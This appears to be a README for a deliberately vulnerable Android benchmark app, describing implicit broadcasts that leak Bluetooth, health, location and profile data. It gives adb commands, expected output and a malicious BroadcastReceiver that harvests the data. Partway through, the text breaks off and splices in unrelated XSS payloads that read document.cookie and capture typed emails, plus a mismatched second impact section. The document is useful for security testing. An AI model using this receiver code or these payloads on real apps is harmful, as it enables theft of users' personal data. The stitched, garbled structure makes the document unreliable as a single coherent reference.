# oxo-android-ben54: Implicit Broadcast with Sensitive Bluetooth Information

## Vulnerability Overview

Implicit Broadcast with Sensitive Bluetooth Information occurs when Android applications send broadcast intents containing sensitive **Bluetooth device data** without restricting which applications can receive them. This vulnerability allows any app with a matching BroadcastReceiver to intercept and access **Bluetooth MAC addresses**, device names, and connection information.

## Attack Vector: Bluetooth Device Information Exposure

**Brief Explanation**: A fitness tracking app that broadcasts **Bluetooth device information** (MAC addresses, device names, battery levels, pairing status) through implicit intents that can be intercepted by any app with matching receivers, enabling device tracking and profiling attacks.

**Key Characteristics:**
- Broadcasts **Bluetooth device MAC addresses** and pairing information
- Exposes connected fitness device names and battery levels
- Leaks Bluetooth connection status and sync data  
- No permission requirements for malicious receivers to intercept Bluetooth data

**Vulnerable Code Pattern:**
```kotlin
// VULNERABLE: Broadcasting Bluetooth device information without restrictions
val deviceIntent = Intent("com.fittracker.DEVICE_CONNECTED")
deviceIntent.putExtra("device_address", "A4:B5:C6:D7:E8:F9")  // Bluetooth MAC
deviceIntent.putExtra("device_name", "FitBand Pro")
deviceIntent.putExtra("battery_level", 85)
deviceIntent.putExtra("connection_status", "Connected")
sendBroadcast(deviceIntent)  // VULNERABLE - Any app can receive Bluetooth data!

// Broadcasting Bluetooth sync data
deviceIntent.putExtra("device_name", bluetoothDevice.name)
deviceIntent.putExtra("user_profile", "John Doe, Premium Member")
sendBroadcast(deviceIntent)  // VULNERABLE - No permission required!
```

## Testing

### Step 1: Install and Launch FitTracker Pro
```bash
# Install the vulnerable fitness app
adb install -r /path/to/oxo-android-ben54/src/app/build/outputs/apk/debug/app-debug.apk

# Launch the app
adb shell am start -n co.ostorlab.myapplication/.MainActivity
```

### Step 2: Trigger Vulnerable Broadcasts
```bash
# Method 1: Simulate workout data broadcasts
adb shell am broadcast -a "com.fittracker.WORKOUT_STARTED" \
  --es user_id "user_12345" \
  --es workout_type "Running" \
  --el start_time 1724770000000 \
  --es user_profile "John Doe, Age: 28, Weight: 75kg"

adb shell am broadcast -a "com.fittracker.WORKOUT_UPDATE" \
  --es user_id "user_12345" \
  --ei heart_rate 145 \
  --ei calories_burned 320 \
  --ef distance_km 2.5 \
  --es workout_type "Running" \
  --el timestamp $(date +%s)000 \
  --ed location_lat 40.7128 \
  --ed location_lon -74.0060

# Method 2: Simulate device connection broadcasts  
adb shell am broadcast -a "com.fittracker.DEVICE_CONNECTED" \
  --es device_name "FitBand Pro" \
  --es device_address "A4:B5:C6:D7:E8:F9" \
  --es device_type "Fitness Tracker" \
  --ei battery_level 85 \
  --es user_profile "John Doe, Premium Member"

# Method 3: Simulate data synchronization broadcasts
adb shell am broadcast -a "com.fittracker.SYNC_COMPLETE" \
  --es user_id "user_12345" \
  --ei devices_synced 3 \
  --es user_email "john.doe@email.com" \
  --es account_type "Premium"
```

### Step 3: Verify Broadcast Interception
```bash
# Check broadcast history for intercepted data
adb shell dumpsys activity broadcasts | sed -n '/Historical broadcasts summary/,/^$/p' | grep -A 5 "com.fittracker"
```

### Expected Results:
```
Historical broadcasts summary [modern]:
#0: act=com.fittracker.SYNC_COMPLETE flg=0x400010 (has extras)
    extras: Bundle[{user_id=user_12345, devices_synced=3, user_email=john.doe@email.com, account_type=Premium}]

#1: act=com.fittracker.DEVICE_CONNECTED flg=0x400010 (has extras) 
    extras: Bundle[{device_name=FitBand Pro, device_address=A4:B5:C6:D7:E8:F9, device_type=Fitness Tracker, battery_level=85, user_profile=John Doe, Premium Member}]

#2: act=com.fittracker.WORKOUT_STARTED flg=0x400010 (has extras)
    extras: Bundle[{start_time=1724770000000, workout_type=Running, user_id=user_12345, user_profile=John Doe, Age: 28, Weight: 75kg}]
```

## Impact Assessment
- **Confidentiality**: High - Exposes sensitive user fitness data, device information, and personal profiles
- **Integrity**: Low - Data interception doesn't modify original information  
- **Availability**: Low - No direct impact on system availability
- **OWASP Mobile Top 10**: M2 - Insecure Data Storage, M4 - Insecure Communication
- **CWE**: CWE-200 (Information Exposure), CWE-926 (Improper Export of Android Application Components)

## Malicious Receiver Example

An attacker app can intercept these broadcasts with:

```xml
<receiver android:name=".MaliciousReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.fittracker.WORKOUT_STARTED" />
        <action android:name="com.fittracker.WORKOUT_UPDATE" />
        <action android:name="com.fittracker.DEVICE_CONNECTED" />
        <action android:name="com.fittracker.SYNC_COMPLETE" />
    </intent-filter>
</receiver>
```

```java
public class MaliciousReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if ("com.fittracker.WORKOUT_UPDATE".equals(action)) {
            String userId = intent.getStringExtra("user_id");
            int heartRate = intent.getIntExtra("heart_rate", 0);
            double lat = intent.getDoubleExtra("location_lat", 0.0);
            double lon = intent.getDoubleExtra("location_lon", 0.0);
            // Attacker now has location and health data
        }
        
        if ("com.fittracker.DEVICE_CONNECTED".equals(action)) {
            String deviceAddress = intent.getStringExtra("device_address");
            String deviceName = intent.getStringExtra("device_name");
            // Attacker now has Bluetooth device information
        }
    }
}

# Image with onerror handler
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<img src='invalid' onerror='alert(\"Cookie: \" + document.cookie)' style='display:none'><p>Loading article...</p>"

# Hover-triggered attack
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<div onmouseover='alert(\"Data stolen on hover!\")' style='padding:20px; background:#f0f0f0'>Hover over this text to read more</div>"

# Input field with onchange handler
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<p>Enter your email for newsletter:</p><input type='email' onchange='alert(\"Email stolen: \" + this.value)' placeholder='your@email.com'>"

# Link with onclick handler
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<a href='#' onclick='alert(\"User clicked malicious link!\"); return false;'>Click here for exclusive content</a>"
```

**Difficulty**: Easy

## Impact Assessment

- **Confidentiality**: High - Can access sensitive user input and app data
- **Integrity**: High - Can manipulate user interactions and steal credentials
- **Availability**: Medium - Can disrupt normal app functionality
- **OWASP Mobile Top 10**: M7 - Client Code Quality
- **CWE**: CWE-79 (Cross-site Scripting), CWE-20 (Improper Input Validation)
